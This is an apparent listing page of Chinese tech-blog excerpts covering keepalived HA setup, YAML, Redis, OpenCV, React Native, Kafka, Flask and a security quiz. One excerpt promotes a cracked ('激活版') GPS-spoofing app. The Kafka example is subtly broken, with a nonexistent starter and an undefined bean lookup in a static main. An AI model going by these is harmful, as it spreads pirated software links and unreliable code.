			<a href="/posts/6ce7ee2ff09fbf5587e62f190e1d00d3/" rel="bookmark">
			高可用负载均衡搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		高可用负载均衡搭建 主机名服务IPnginx-ka-master172.17.1.131nginx-ka-backup172.17.1.132web1-server172.17.1.133web2-server172.17.1.134VIP172.17.1.88 1、安装nginx和keepalived服务 root@haproxy-master:~# apt install keepalived haproxy -y 2、配置keepalived服务 (1)master节点 root@haproxy-master:~# cp /usr/share/doc/keepalived/samples/keepalived.conf.vrrp /etc/keepalived/keepalived.conf root@haproxy-master:~# cat /etc/keepalived/keepalived.conf ! Configuration File for keepalived #全局配置 global_defs { notification_email { 2923035330@qq.com } notification_email_from keepalived@localhost smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id haproxy_master #主机唯一标识，每个keepalived的节点标识不能相同，若相同会影响切换脚本的执行 vrrp_skip_check_addr #vrrp_strict #开启限制，会自动生效防火墙设置，导致无法访问VIP vrrp_grap_interval 0 vrrp_gna_interval 0 vrrp_mcast_group4 224.0.0.18 #默认组播IP地址，组播地址范围：224.0.0.0-239.255.255.255 } vrrp_script check_nginx { #定义一个负载服务器检测脚本 script "/usr/bin/killall -0 nginx" #script后面跟一个shell命令或者脚本绝对路径 # script "/etc/keepalived/nginx_check.sh" interval 3 #指定脚本的检查间隔为5秒 weight -50 #权重减少50 fall 3 #如果脚本连续3次检查失败，则认为服务不健康 rise 1 #只要一次检查成功，就认为服务已经恢复。 } #VRRP虚拟路由器 vrrp_instance master { #VRRP实例名称 state MASTER #keepalived的角色（master or backup) interface eth0 #绑定当前虚拟路由器使用的物理接口，如：eth0,bond0,eth0:1等 virtual_router_id 50 #虚拟路由器的唯一标识，0-255 (注意：keepalived的主备应保持一致) nopreempt #非抢占模式（注意：主keepalived设置非抢占模式后，备就可以不用了） priority 120 #虚拟路由器的优先级 advert_int 1 virtual_ipaddress { #虚拟IP # 172.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ce7ee2ff09fbf5587e62f190e1d00d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/404c83398309bf7b0101cbecbf8671a1/" rel="bookmark">
			机器人学论文——智能施药机器人调研报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
摘 要
Abstract
第一章：引言
1.1研究背景
1.2 研究意义
1.3文章架构
第二章：智能施药机器人发展现状
2.1引言
2.2 大田智能施药机器人发展现状
2.3 果园智能施药机器人发展现状
2.4 设施农业智能施药机器人发展现状
第三章：智能施药机器人移动平台设计
3.1引言
3.2 轮式施药机器人移动平台
3.3 履带式施药机器人移动平台
3.4 足式施药机器人移动平台
3.5 复合式施药机器人移动平台
3.6 空中施药机器人移动平台
3.7 分析与比较
第四章：智能施药机器人喷雾装置
4.1 引言
4.2 大田场景下的喷雾装置
4.3 温室场景下的喷雾装置
4.4果园场景下的喷雾装置 4.5分析与比较
第五章：智能施药机器人导航技术
5.1引言
5.2 GPS 导航 5.3 传感器导航
5.4视觉导航 5.5 激光雷达导航
5.6分析与比较
第六章：智能施药机器人智能识别技术
6.1引言
6.2红外线传感检测 6.3 超声波传感检测
6.4 激光雷达检测 6.5 机器视觉检测
6.6 光谱成像检测
6.7分析与比较
第七章：总结与展望
7.1研究目前存在的问题
7.2 未来发展方向
7.3总结
摘 要 喷施化学农药是病虫害防治最主要的手段，对保证作物的产量起着至关重要的作用。传统的施药机械工作效率低，且使用同一施药量进行连续喷施作业易造成农药浪费、环境污染。随着农业智能化发展，机器人被广泛应用到农业植保作业中，智能施药机器人以减少劳动力投入、提高农药利用率、减少农药施用量以及减少环境污染为目的，实现了更加高效、精准的病虫害防治。智能施药机器人是集复杂农业机械、智能感知、智能决策、智能控制等技术为一体的现代农业施药装备，可自主、高效、安全、可靠地完成施药作业任务。为明确智能施药机器人及关键技术的国内外研究现状，本文总结了适用于不同作业场景的施药机器人的应用进展，从智能施药机器人的移动平台设计、喷雾装置设计、导航技术、智能识别技术4个方面进行分析，结合施药机器人作业环境的复杂多变性，分析智能施药机器人关键技术的现存问题，阐述智能施药机器人未来的发展趋势是精准变量施药、自主导航以及无人化作业，以期为智能施药机器人在未来的研究提供参考。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/404c83398309bf7b0101cbecbf8671a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c53508206adaa2460bb4a3c95744fb7f/" rel="bookmark">
			yaml语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、简介 yaml基本语法规则： 大小写敏感使用缩进表示层级关系缩进时不允许使用Tab键，只允许使用空格。缩进的空格数目不重要，只要相同层级的元素左侧对齐即可#表示注释，从这个字符一直到行尾，都会被解析器忽略，这个和python的注释一样 YAML 支持的数据结构有三种: 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）纯量（scalars）：单个的、不可再分的值 注意：
冒号后面，要跟一个空格。
二、基本类型（数字/字符串） 字符串默认不使用引号表示（也可以使用引号）.
如果字符串之中包含空格或特殊字符，需要放在引号之中.
yaml -&gt; json:
age: 18 score: 98.5 name: 张三 firstname: "jack ma" { "age": 18, "score": 98.5, "name": "张三", "firstname": "jack ma" } 三、数组/列表 数组/列表，有2种写法。
yaml -&gt; json:
subjects: ["语文", "数学", "英语"] language: [Java, python, C++] fruits: - banana - apple - orange { "subjects": [ "语文", "数学", "英语" ], "language": [ "Java", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c53508206adaa2460bb4a3c95744fb7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4370d96cc981547d2d9689879fe9f1f9/" rel="bookmark">
			2024最新Windows版本的Redis安装包和工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2024最新Redis安装包，因为网上的都不完整，所以自己保存了一份
Redis官网不提供windows安装包，
只提供 WSL2方法安装（在Windows上运行一个Linux，有兴趣的可以自行研究，我没有，所以跳过~）
包含7.2.4版本，7.0.15版本，5.0.14版本，和3.2.1版本（以及Another-Redis-Desktop-Manager工具）
微软官方2016 年 7 月 1 日更新3.2.1版本之后，就不再更新了
3.2.1版本和5.0.14版本可以一键安装使用，其他版本需要命令启动安装（详细看各readme.md）
其他版本都是大家使用相对比较稳定的~ 请自行选择使用
点击网盘提取链接下载：
2024最新redis安装包和工具——网盘分享夸克网盘是夸克推出的一款云服务产品，功能包括云存储、高清看剧、文件在线解压、PDF一键转换等。通过夸克网盘可随时随地管理和使用照片、文档、手机资料，目前支持Android、iOS、PC、iPad。https://pan.quark.cn/s/6f3b1e09180b
3.2.1版本和5.0.14版本安装之后，按键盘上的Windows图标键，搜索“服务”两个字
找到Redis
右键可以设置系统重启，自动重启，就不需要每次手动启动了
其他版本，可以根据Readme.md文档手动安装~
其他redis版本来源：
希望以上信息对你有所帮助！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3ca4b0ffbc49c3840dd0b603c13c506/" rel="bookmark">
			洛谷 P1126 机器人搬重物
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 机器人移动学会（RMI）现在正尝试用机器人搬运物品。机器人的形状是一个直径 1.6 米的球。在试验阶段，机器人被用于在一个储藏室中搬运货物。储藏室是一个 N×M 的网格，有些格子为不可移动的障碍。机器人的中心总是在格点上，当然，机器人必须在最短的时间内把物品搬运到指定的地方。机器人接受的指令有：
向前移动 1 步（Creep）；向前移动 2 步（Walk）；向前移动 3 步（Run）；向左转（Left）；向右转（Right）。 每个指令所需要的时间为 1 秒。请你计算一下机器人完成任务所需的最少时间。
输入格式 第一行为两个正整数 N,M (1≤N,M≤50)，下面 N 行是储藏室的构造，0 表示无障碍，1 表示有障碍，数字之间用一个空格隔开。接着一行有 4 个整数和 1 个大写字母，分别为起始点和目标点左上角网格的行与列，起始时的面对方向（东 E，南 S，西 W，北 N），数与数，数与字母之间均用一个空格隔开。终点的面向方向是任意的。
输出格式 一个整数，表示机器人完成任务所需的最少时间。如果无法到达，输出 −1−1。
输入输出样例 输入 #1
9 10 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 1 0 7 2 2 7 S 输出 #1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3ca4b0ffbc49c3840dd0b603c13c506/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f326a97244c0932727a37300f54091c3/" rel="bookmark">
			C&#43;&#43;&amp;Python&amp;C# 三语言OpenCV从零开发(6):边界填充&#43;Csharp调用Python matplotlib代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 相关链接前言测试图片边界填充pythonC++Csharp错误代码Mat遍历最终代码和结果 总结 相关链接 C++&amp;Python&amp;Csharp in OpenCV 专栏
【2022B站最好的OpenCV课程推荐】OpenCV从入门到实战 全套课程（附带课程课件资料+课件笔记）
前言 今天来接着学习OpenCV，现在主要是以Python代码为主了，所以先实现Python，在用C++/Csharp重现一遍。
测试图片 边界填充 边界填充就是向外填充图片信息，将图片扩大。填充分为上下左右四个方向，所以我们要指定四个方向的填充大小。
python # %% # 导入包 import cv2 import matplotlib.pyplot as plt import numpy as np image = cv2.imread("D:/workSpace/OpenCV/HellOpenCV/Resources/image/cat.png") # 声明填充区域 fill = { 'top':50, 'bottom':50, 'left':50, 'right':50 } # 填充也有很多的算法，我们这里尝试几个算法 replicate = cv2.copyMakeBorder(image,fill['top'],fill['bottom'],fill['left'],fill['right'], cv2.BORDER_REPLICATE) reflect = cv2.copyMakeBorder(image,fill['top'],fill['bottom'],fill['left'],fill['right'],cv2.BORDER_REFLECT) reflect101 = cv2.copyMakeBorder(image,fill['top'],fill['bottom'],fill['left'],fill['right'],cv2.BORDER_REFLECT_101) wrap = cv2.copyMakeBorder(image,fill['top'],fill['bottom'],fill['left'],fill['right'],cv2.BORDER_WRAP) constant = cv2.copyMakeBorder(image,fill['top'],fill['bottom'],fill['left'],fill['right'],cv2.BORDER_CONSTANT,value=0) plt.subplot(231),plt.imshow(image,'gray'),plt.title('ORIGINAL') plt.subplot(232),plt.imshow(replicate,'gray'),plt.title('replicate') plt.subplot(233),plt.imshow(reflect,'gray'),plt.title('reflect') plt.subplot(234),plt.imshow(reflect101,'gray'),plt.title('reflect101') plt.subplot(235),plt.imshow(wrap,'gray'),plt.title('wrap') plt.subplot(236),plt.imshow(constant,'gray'),plt.title('constant') plt.show() # cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f326a97244c0932727a37300f54091c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8832aa6a93e76b0c72f7b93325abbc58/" rel="bookmark">
			GPS位置虚拟软件 AnyGo mac激活版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AnyGo for Mac是一款一键将iPhone的GPS位置更改为任何位置的强大软件！使用AnyGo在其iOS或Android设备上改变其GPS位置，并在任何想要的地方显示自己的位置。这对那些需要测试应用程序、游戏或其他依赖于地理位置信息的应用程序的开发人员来说非常有用，也可用于保护隐私。
软件下载：AnyGo mac激活版
要在AnyGo中进行GPS位置模拟，您只需连接您的设备并选择“位置模拟”选项，然后输入您想要模拟的位置信息即可。通过使用AnyGo，您可以轻松地模拟任何地方的位置，而无需实际去到那个地方。
本文由 mdnice 多平台发布
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21e3aeb7a597ee1f7319b61abff205a5/" rel="bookmark">
			短视频解析单页源码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这个一个网页html解析短视频无水印视频的源码，电脑直接打开也可以本地使用，也可以上传到网站搭建成网页使用。
下载地址：YISHEN源码网 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73e83a220f94931733fe08b6f27fb7ea/" rel="bookmark">
			React Native性能优化指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要 本文将介绍在React Native开发中常见的性能优化问题和解决方案，包括ScrollView内无法滑动、热更新导致的文件引用问题、高度获取、强制横屏UI适配、低版本RN适配iOS14、缓存清理、navigation参数取值等。通过代码案例演示和详细说明，帮助开发者更好地理解和解决React Native中的性能问题。
引言 React Native作为一种跨平台的移动应用开发框架，受到了广泛的关注和应用。然而，在实际开发中，我们常常会遇到一些性能优化的挑战，如何解决这些问题成为了开发者们需要思考的重要问题。本篇博客旨在帮助开发者更好地理解React Native中的性能优化问题，并提供相应的解决方案。
正文 ScrollView无法在TouchableOpacity组件内滑动 当ScrollView内的内容使用TouchableOpacity进行包裹时，可能会出现无法滑动的情况。解决方法是将onPress={() =&gt; {}}属性添加到TouchableOpacity组件上。
&lt;TouchableOpacity onPress={() =&gt; {}}&gt; {/* Your content here */} &lt;/TouchableOpacity&gt; RN热更新问题 使用codepush进行热更后，src目录下的音频文件在安卓系统中无法引用。解决方法是将文件放到原生系统中，热更的bundle文件无法打包音频文件。
RN中获取高度的解决方法 // 屏幕高度（状态栏+安全区+下方虚拟按键操作区） Dimensions.get('screen').height // 窗口高度（状态栏+安全区） Dimensions.get('window').height RN强制横屏UI适配问题 通过Dimensions.get()获取到的宽、高并不是横屏后的宽高。解决方法是使用横屏下宽&gt;高的普遍规则进行页面适配。
低版本RN（0.63以下）适配iOS14图片无法显示问题 修改node_modules中react-native/Libraries/Image/RCTUIImageViewAnimates.m文件，添加以下内容：
if (_currentFrame) { //275行 layer.contentsScale = self.animatedImageScale; layer.contents = (__bridge id)_currentFrame.CGImage; } else { //加上这个 不然ios14以上的系统看不见图片 [super displayLayer:layer]; } RN清理缓存 watchman watch-del-allrm -rf node_modules &amp;&amp; npm installrm -rf /tmp/metro-bundler-cache-* (npm start --reset-cache/react-native start --reset-cache)rm -rf /tmp/haste-map-react-native-packager-* RN navigation参数取值 console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73e83a220f94931733fe08b6f27fb7ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5e24347c69f786a22e3e23f8fd2688c/" rel="bookmark">
			网络安全进阶试题——附答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选择题 以下哪个是网络安全的首要原则？
A. 开放访问B. 机密性C. 全球畅通D. 数据泄露 什么是“零信任”安全模型的核心概念？
A. 信任所有用户B. 信任无线网络C. 从内到外建立信任D. 不信任任何用户，无论其在内部还是外部 常见的社交工程攻击手段包括以下哪项？
A. 防火墙设置B. 虚拟专用网络C. 伪造电子邮件D. 加密通信 下列哪个是单点故障的示例？
A. 多因素身份验证B. 数据备份C. 仅有一个关键服务器D. 定期安全培训 在网络安全中，“DMZ”指的是什么？
A. 数据管理区域B. 反病毒区C. 遥测监控区D. 避难安全区 以下哪项是密码学中常用的对称加密算法？
A. RSAB. AESC. SHAD. ECC 什么是“恶意软件”？
A. 一种硬件设备B. 一种计算机病毒C. 一种网络协议D. 一种电子邮件服务 在网络安全中，“Phishing”是指什么？
A. 防火墙设置B. 社交工程攻击C. 无线网络安全D. 数据备份策略 哪种网络攻击通过发送大量请求来超载目标系统？
A. SQL注入B. DDoS攻击C. Cross-site scripting (XSS)D. 蜜罐攻击 在多因素身份验证中，因素的类型可以包括：
A. 用户名和密码B. 生物识别信息C. 电子邮件地址D. 手机号码
11.“防火墙”主要用于什么目的？A. 数据存储B. 数据传输C. 网络安全D. 用户认证12.以下哪个是公钥基础设施（PKI）的组成部分？A. 双因素认证B. 数字证书C.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5e24347c69f786a22e3e23f8fd2688c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34d047bf55e0e28a0d04d0f05806fbb8/" rel="bookmark">
			如何利用PyTorch？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇文章介绍了“What is PyTorch?”,本篇文章探讨一下“How to use PyTorch？”
1、PyTorch PyTorch 是一个开源机器学习库，基于 Torch 库开发，主要由 Facebook 的人工智能研究实验室（FAIR）研发。它是一个强大且灵活的深度学习框架，以其动态计算图特性而广受欢迎，在人工智能领域的研究和开发中备受欢迎。
PyTorch 提供以下功能：
动态计算图：PyTorch 支持动态图机制，这意味着在运行时可以实时改变计算图结构，这相较于静态图框架提供了更大的灵活性和更简便的调试过程。
深度神经网络：它全面支持构建和训练深度神经网络，并通过 autograd 包实现自动微分。
张量库：类似于 NumPy，PyTorch 拥有丰富的张量库，可在 CPU 和 GPU 上运行，并支持深度学习任务所需的多种数学运算。
模型训练：torch.nn 模块提供了大量模块和损失函数用于构建和训练神经网络，同时包含如梯度下降等优化工具。
迁移学习与预训练模型：通过 PyTorch Hub 和 torchvision，用户可以获得预训练模型并进行微调或迁移学习。
CUDA 支持：PyTorch 支持 CUDA，这是 NVIDIA 公司的并行计算平台及应用编程接口（API），专为 GPU 设计，使得高性能计算得以实现。
便捷部署：利用 PyTorch 的 JIT 编译器，模型可以转换成优化过的 C++ 代码，进而以独立应用程序形式部署，或者通过 ONNX 等库部署到移动设备上。
活跃社区：PyTorch 拥有一个活跃的研究员和实践者组成的社区，他们通过论坛、教程和教育资源等形式持续推动 PyTorch 的发展和完善。
总体来说，PyTorch 在易用性、模块化和性能之间取得了一个良好的平衡，既适合快速原型设计，也适用于生产级别的深度学习项目部署。
2、PyTorch的用户规模 PyTorch 已成为深度学习领域非常流行的框架之一，其用户群体覆盖了学术界和工业界的众多研究者与工程师。由于其灵活的动态图机制、易读易写的代码风格以及强大的社区支持，越来越多的开发者选择 PyTorch 作为他们的首选深度学习工具。尽管没有最新的具体用户数字，但可以肯定的是，随着机器学习和人工智能应用的普及和发展，PyTorch 的用户规模一直在持续扩大。
学术界：全球许多研究者和学生在论文发表、课程教学以及日常研究中使用PyTorch进行深度学习模型的设计与训练。在顶级人工智能会议如NeurIPS, ICML, ICLR等上，基于PyTorch的研究成果数量逐年增长。
工业界：诸多科技公司包括Facebook（PyTorch的主要贡献者）、Uber、Salesforce等在其产品和服务中应用了PyTorch。同时，许多初创企业和成熟企业也纷纷选择PyTorch进行机器学习和深度学习项目的开发。
开源社区：GitHub上的PyTorch项目有着大量的关注者、Star数及Fork数，活跃的社区提交表明其拥有庞大的开发者基础。此外，PyTorch Hub提供了丰富的预训练模型库，吸引了众多用户下载和使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34d047bf55e0e28a0d04d0f05806fbb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4553728d8b8715ddc66b849a1993cae9/" rel="bookmark">
			spring boot kafka 发送消息 完整的例子工程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下是一个简单的Spring Boot Kafka发送消息的完整例子：
首先，添加Spring Boot Kafka的依赖到你的pom.xml文件：
xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-kafka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 在application.properties文件中配置Kafka的相关属性：
properties spring.kafka.bootstrap-servers=localhost:9092 spring.kafka.consumer.group-id=test-group spring.kafka.template.default-topic=test-topic 创建一个Kafka生产者类，并注入KafkaTemplate：
java import org.springframework.beans.factory.annotation.Autowired; import org.springframework.kafka.core.KafkaTemplate; import org.springframework.stereotype.Service; @Service public class KafkaProducerService { @Autowired private KafkaTemplate&lt;String, String&gt; kafkaTemplate; public void sendMessage(String message) { kafkaTemplate.send("test-topic", message); } } 在你的Spring Boot应用程序中，你可以调用sendMessage方法发送消息：
java @Autowired private KafkaProducerService kafkaProducerService; public static void main(String[] args) { SpringApplication.run(MyApplication.class, args); KafkaProducerService kafkaProducerService = SpringApplicationContext.getBean(KafkaProducerService.class); kafkaProducerService.sendMessage("Hello, Kafka!"); } 以上是一个简单的Spring Boot Kafka发送消息的完整例子。你可以根据自己的需求进行修改和扩展。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9abf1463388153b2a5406f3e445d58f/" rel="bookmark">
			Web 开发 1: Flask 框架介绍和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 Web 开发中，Flask 是一个流行且灵活的 Python Web 框架，用于构建 Web 应用程序。它简洁而易于上手，适用于小型到中型的项目。在本篇博客中，我将为你介绍 Flask 框架的基础知识和常用技巧，帮助你更好地掌握 Web 开发中的框架部分。
Flask 框架基础知识 安装 Flask 在开始使用 Flask 之前，你需要先安装 Flask。你可以使用 pip 包管理器来安装 Flask。打开终端并运行以下命令：
pip install flask 安装完成后，你就可以在你的项目中使用 Flask 了。
创建 Flask 应用 在使用 Flask 之前，你需要先创建一个 Flask 应用。创建一个 Flask 应用非常简单，只需几行代码即可。以下是一个示例：
from flask import Flask app = Flask(__name__) @app.route('/') def hello(): return 'Hello, Flask!' if __name__ == '__main__': app.run() 在这个示例中，我们首先导入了 Flask 模块，并创建了一个 Flask 应用实例。然后，我们使用 @app.route('/') 装饰器定义了一个路由，该路由将处理根路径的请求。最后，我们使用 app.run() 方法运行应用。
路由和视图函数 在 Flask 中，路由用于将 URL 和视图函数关联起来。视图函数是处理请求并返回响应的函数。以下是一个示例：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9abf1463388153b2a5406f3e445d58f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6dffe6a14216d1f6dc59077a6aaad28/" rel="bookmark">
			python opencv 图片缺陷检测（讲解直方图以及相关系数对比法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、利用直方图的方式进行批量的图片缺陷检测（方法简单） 二、步骤（完整代码见最后） 2.1灰度转换（将原图和要检测对比的图分开灰度化） 灰度化的作用是因为后面的直方图比较需要以像素256为基准进行相关性比较
img = cv2.imread("0.bmp") #原图灰度转换 gray = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) #循环要检测的图，均灰度化 for i in range(1, 6): t1=cv2.cvtColor(cv2.imread(str(i)+".bmp"),cv2.COLOR_RGB2GRAY) 2.2 直方图计算（结果其实是二维的图表–用画图的方式展示） calcHist参数讲解 第一个参数：必须为列表[],哪怕只有一个图片，image输入图像channels:：传入图像的通道，如果是灰度图像，那就不用说了，只有一个通道，值为0，如果是彩色图像（有3个通道），那么值为0,1,2,中选择一个，对应着BGR各个通道。这个值也得用[]传入。mask：掩膜图像。如果统计整幅图，那么为none。主要是如果要统计部分图的直方图，就得构造相应的炎掩膜来计算。histSize：灰度级的个数，需要中括号，比如[256]ranges:像素值的范围，通常[0,256] ，有的图像如果不是0-256，比如说你来回各种变换导致像素值负值、很大，则需要调整后才可以。 #直方图计算的函数，反应灰度值的分布情况 hist = cv2.calcHist([gray], [0], None, [256], [0.0,255.0]) h1 = cv2.calcHist([t1], [0], None, [256], [0.0,255.0]) 2.3 相关性比较 cv2.compareHist(H1, H2, method)
其中：
H1，H2 分别为要比较图像的直方图method - 比较方式比较方式（method）相关性比较 (method=cv.HISTCMP_CORREL) 值越大，相关度越高，最大值为1，最小值为0-----------------------只用一种固然不是很严谨，但这里做示范，把阈值调高也差不多（取大于等于0.9）卡方比较(method=cv.HISTCMP_CHISQR 值越小，相关度越高，最大值无上界，最小值0巴氏距离比较(method=cv.HISTCMP_BHATTACHARYYA) 值越小，相关度越高，最大值为1，最小值为0 #相关性计算，采用相关系数的方式 result = cv2.compareHist(hist,h1,method=cv2.HISTCMP_CORREL) 2.4 展示结果（判断阈值） 相关系数含义参考表
im = Image.open(str(i) + ".bmp") draw = ImageDraw.Draw(im) fnt = ImageFont.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6dffe6a14216d1f6dc59077a6aaad28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d69ab693c3308428015ce7796d15038/" rel="bookmark">
			Redis 高并发场景下热点缓存的重建策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在高并发的系统中，缓存是提升性能的关键。然而，当面临热点缓存的问题时，即某些缓存数据频繁被请求，就可能导致缓存雪崩、穿透等问题。为了应对这种情况，需要制定合适的策略进行热点缓存的重建。
1. 了解热点缓存问题 热点缓存问题通常发生在某些特定数据被大量请求的情况下，如果这些数据在缓存中失效，可能导致大量请求直接打到数据库，增加数据库负载，降低系统性能。
2. 合理设置缓存过期时间 为了减轻热点缓存问题，首先应该合理设置缓存过期时间。过期时间的设置要根据业务场景和数据的变化频率来确定，避免所有缓存同时失效。
3. 使用互斥锁避免缓存击穿 在某些场景下，可能会因为某个缓存失效而导致大量并发请求直接打到数据库，产生缓存击穿。使用互斥锁，即在缓存失效的时候，只允许一个请求去更新缓存，其他请求等待，成功更新缓存的请求释放锁。
// 伪代码示例 String lockKey = "cache_lock_key"; boolean locked = redis.tryLock(lockKey, timeout); if (locked) { try { // 查询数据库，更新缓存 // ... } finally { redis.unlock(lockKey); } } else { // 等待一段时间再重试或直接走数据库 // ... } 4. 使用缓存预热 在系统启动或业务低峰期，可以通过缓存预热的方式将热点数据加载到缓存中，提前避免热点数据失效时的问题。这样可以在系统运行过程中保持缓存的热度。
5. 定期更新缓存 为了防止缓存中的数据过期，可以定期主动更新缓存。通过定时任务或其他方式，定期刷新缓存中的热点数据，确保缓存数据一直保持新鲜。
6. 异步更新缓存 在更新缓存的过程中，可以考虑使用异步更新的方式，避免同步操作阻塞线程。将数据的更新操作放入消息队列，异步执行，提高系统的并发处理能力。
7. 使用备份缓存 为了应对缓存失效时的问题，可以在系统中使用备份缓存。即在主缓存失效时，可以尝试从备份缓存中获取数据，避免直接打到数据库。
8. 动态调整缓存过期时间 根据系统运行情况和负载情况，动态调整热点数据的缓存过期时间。可以根据缓存访问频率、数据的变化情况等因素进行动态调整，提高缓存命中率。
总的来说，面对Redis高并发场景下的热点缓存问题，需要综合考虑多种因素，制定合理的缓存策略和重建机制。这样可以有效地提升系统性能，降低数据库负载，提高用户体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1c3226a6be804cc00363ee4d2d9ce42/" rel="bookmark">
			子组件中事件结束后切换父组件的el-tab-pane
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(vue)子组件中事件结束后切换父组件的el-tab-pane 需求：
父组件
&lt;el-tabs v-model="activeName" type="border-card" tab-position="left"&gt; &lt;el-tab-pane label="分析建模" name="1" :disabled="true" /&gt; ... &lt;el-tab-pane label="在线训练" name="4"&gt; &lt;OnlineTraining @activeNum="activeNum" /&gt; //重点 &lt;/el-tab-pane&gt; &lt;el-tab-pane label="任务列表" name="5"&gt; &lt;TaskManage /&gt; &lt;/el-tab-pane&gt; ... &lt;/el-tabs&gt; ... activeNum(val) { this.activeName = val; }, 子组件
executDialogForm() { this.$emit("activeNum", "5"); }, 解决参考：https://blog.csdn.net/qq_52863420/article/details/121844984
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d68673d8ba573fad3158ec936bb648fb/" rel="bookmark">
			100天精通鸿蒙从入门到跳槽——第10天：TypeScript 知识储备：模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主猫头虎的技术世界
🌟 欢迎来到猫头虎的博客 — 探索技术的无限可能！
专栏链接：
🔗 精选专栏：
《面试题大全》 — 面试准备的宝典！《IDEA开发秘籍》 — 提升你的IDEA技能！《100天精通Golang》 — Go语言学习之旅！《100天精通鸿蒙》 — 从Web/安卓到鸿蒙大师！ 100天精通鸿蒙OS（基础篇） 100天精通鸿蒙从入门到跳槽——第10天：TypeScript 知识储备：模块📝 摘要🌟一、引言📚二、正文1. 模块定义2. 导入3. 导出4. 命名空间导入5. 模块作用域6. 模块与命名空间结合 📌三、总结📖四、参考资料 100天精通鸿蒙从入门到跳槽——第10天：TypeScript 知识储备：模块 📝 摘要 🌟 探索TypeScript模块的核心：组织和优化你的代码
在 TypeScript 的编程世界里，模块的概念扮演着至关重要的角色。本文深入探讨了 TypeScript 中模块的强大功能，提供了一个全面的视角来理解模块的定义、导入、导出等核心概念。模块不仅帮助开发者避免命名冲突，而且大幅提升代码的可读性和可维护性，是构建高效、安全和可靠 TypeScript 应用的关键。
